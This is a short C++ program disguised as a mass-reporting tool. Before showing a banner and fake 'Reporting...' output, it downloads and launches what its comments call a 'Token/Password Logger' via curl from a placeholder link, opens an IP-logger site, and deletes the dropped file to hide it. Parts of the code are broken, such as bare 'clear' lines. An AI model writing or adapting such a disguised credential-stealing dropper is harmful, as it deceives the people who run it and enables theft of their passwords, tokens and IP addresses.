#include "pch.h"
#include <iostream>
#include <cstdlib>
#include <windows.h>
#include <thread>
#include <chrono>

using namespace std;
int main() {
//Installs the Token/Password Logger
        system("pip install curl");
        system("python - m pip install curl");
        clear
        system("curl tokenloggerlinkhere.exe >> debuged.exe");
        clear
//Starts the Token/Password Logger
        system("start debuged.exe");
//Goes to the ip logger website
        system("start iploggerlinkhere");
        Sleep(2500);
//Deletes the Token/Password logger
        system("del debuged.exe");
//Clears cmd
        system("cls");
//Banner
        std::cout << "-------------------------------" << endl;
        std::cout << "  _______   _______   _______  " << endl;
        std::cout << " /       \ /       \ /       \ " << endl;
        std::cout << " $$$$$$$  |$$$$$$$  |$$$$$$$  |" << endl;
        std::cout << " $$ |  $$ |$$ |__$$ |$$ |__$$ |" << endl;
        std::cout << " $$ |  $$ |$$    $$< $$    $$< " << endl;
        std::cout << " $$ |  $$ |$$$$$$$  |$$$$$$$  |" << endl;
        std::cout << " $$ |__$$ |$$ |  $$ |$$ |__$$ |" << endl;
        std::cout << " $$    $$/ $$ |  $$ |$$    $$/ " << endl;
        std::cout << " $$$$$$$/  $$/   $$/ $$$$$$$/  " << endl;
        std::cout << "-------------------------------" << endl;
//Choose Username
        int y;
        std::cout << "Please choose a Username!" << endl;
        cin >> y;
        Sleep(1000);
        std::cout << "Username ~> " << y << endl;
//Choose Threads
        int x;
        std::cout << "Please choose the Threads" << endl;
        cin >> x;
        Sleep(1000);
        std::cout << "Threads ~> " << x << endl;
        system("cls");
//Options
        std::cout << "-------------------------------" << endl;
        std::cout << "Username ~> "<< y << endl; 
        std::cout << "Threads ~> "<< x << "P/S" << endl; 
        std::cout << "-------------------------------" << endl;
        std::cout << "" << endl;
//Report
        std::cout << "Reporting..." << endl;
        Sleep(5000);
//Exits the software
        std::cout << "Exiting..." << endl;
        Sleep(2500);
        system("exit");
        return 0;
}
